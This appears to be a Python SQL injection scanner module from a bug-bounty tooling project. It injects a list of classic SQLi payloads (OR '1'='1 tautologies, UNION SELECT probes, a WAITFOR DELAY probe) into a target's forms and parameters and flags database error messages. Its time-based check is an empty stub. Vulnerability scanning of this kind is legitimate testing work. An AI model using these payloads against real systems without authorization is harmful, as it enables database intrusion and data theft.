#!/usr/bin/env python3
"""
SQL Injection Scanner Agent
Detects SQLi in forms, parameters, and headers
"""

import os
import sys
import json
import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from pathlib import Path
from core.evidence.store import EvidenceStore
from core.rate_limit import from_env as budget_from_env

OUTPUT_DIR = os.getenv("SWARM_OUTPUT_DIR") or str(Path(__file__).resolve().parents[2] / "output")

class SQLiScanner:
    def __init__(self, target, forms=None, endpoints=None):
        self.target = target
        self.forms = forms or []
        self.endpoints = endpoints or []
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "BugBountyBot/1.0"})
        
        # SQLi payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' AND '1'='1",
            "1' AND '1'='1' --",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "admin'--",
            "1' ORDER BY 1--",
            "'; WAITFOR DELAY '0:0:5'--"
        ]
        
        # Error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\\.",
            r"Driver.*SQL[-_ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Error",
            r"ODBC SQL Server Driver",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException"
        ]
    
    def scan(self):
        """Run SQLi scan"""
        print(f"   🎯 SQLi Scanner: {self.target}")
        self._evidence = EvidenceStore(OUTPUT_DIR, level=os.getenv("EVIDENCE_LEVEL", "standard"))
        self._budget = budget_from_env()
        
        # Scan forms
        for form in self.forms:
            self.scan_form(form)
        
        # Scan endpoints
        for endpoint in self.endpoints[:15]:
            parsed = urlparse(endpoint)
            if parsed.query:
                self.scan_params(endpoint, parse_qs(parsed.query))
        
        self.save_results()
        return self.findings
    
    def scan_form(self, form):
        """Test form for SQLi"""
        action = form.get("action", "/")
        method = form.get("method", "get").upper()
        inputs = form.get("inputs", [])
        
        if not inputs:
            return
        
        url = urljoin(self.target, action)
        
        baseline = self._baseline_form(url, method, inputs)
        for payload in self.payloads[:5]:
            data = {}
            for inp in inputs:
                if inp:
                    data[inp] = payload
            
            try:
                if method == "POST":
                    self._budget.wait_for_budget()
                    resp = self.session.post(url, data=data, timeout=15)
                    self._evidence.save_http(url, "POST", {"data": data}, {"status": resp.status_code, "body": resp.text[:2000]})
                else:
                    self._budget.wait_for_budget()
                    resp = self.session.get(url, params=data, timeout=15)
                    self._evidence.save_http(url, "GET", {"params": data}, {"status": resp.status_code, "body": resp.text[:2000]})
                
                if self._differs(baseline, resp):
                    self.check_errors(url, payload, resp.text)
                
            except Exception:
                pass
    
    def scan_params(self, url, params):
        """Test parameters for SQLi"""
        baseline = self._baseline_params(url, params)
        for payload in self.payloads[:5]:
            test_params = {k: payload for k in params.keys()}
            
            try:
                self._budget.wait_for_budget()
                resp = self.session.get(url, params=test_params, timeout=15)
                self._evidence.save_http(url, "GET", {"params": test_params}, {"status": resp.status_code, "body": resp.text[:2000]})
                if self._differs(baseline, resp):
                    self.check_errors(url, payload, resp.text)
                
                # Time-based detection
                if "WAITFOR" in payload:
                    # Check response time (simplified)
                    pass
                    
            except Exception:
                pass
    
    def check_errors(self, url, payload, response):
        """Check for SQL error messages"""
        for pattern in self.error_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                finding = {
                    "type": "SQLi",
                    "subtype": "Error-Based",
                    "url": url,
                    "payload": payload,
                    "error_pattern": pattern,
                    "severity": "CRITICAL",
                    "timestamp": datetime.utcnow().isoformat()
                }
                
                if finding not in self.findings:
                    self.findings.append(finding)
                    print(f"      ⚠️ SQLi FOUND: {url}")
                return

    def _baseline_form(self, url, method, inputs):
        data = {inp: "baseline" for inp in inputs if inp}
        try:
            if method == "POST":
                self._budget.wait_for_budget()
                return self.session.post(url, data=data, timeout=15)
            self._budget.wait_for_budget()
            return self.session.get(url, params=data, timeout=15)
        except Exception:
            return None

    def _baseline_params(self, url, params):
        data = {k: "baseline" for k in params.keys()}
        try:
            self._budget.wait_for_budget()
            return self.session.get(url, params=data, timeout=15)
        except Exception:
            return None

    def _differs(self, baseline, resp) -> bool:
        if not baseline:
            return True
        if baseline.status_code != resp.status_code:
            return True
        try:
            return abs(len(baseline.text) - len(resp.text)) > 50
        except Exception:
            return True
    
    def save_results(self):
        """Save findings"""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        safe_target = re.sub(r"[^A-Za-z0-9._-]+", "_", self.target).strip("_")
        filename = f"{OUTPUT_DIR}/sqli_{safe_target}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, "w") as f:
            json.dump({
                "target": self.target,
                "findings": self.findings,
                "count": len(self.findings)
            }, f, indent=2)
        
        print(f"      💾 SQLi findings: {len(self.findings)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <target_url>")
        sys.exit(1)
    
    scanner = SQLiScanner(sys.argv[1])
    scanner.scan()
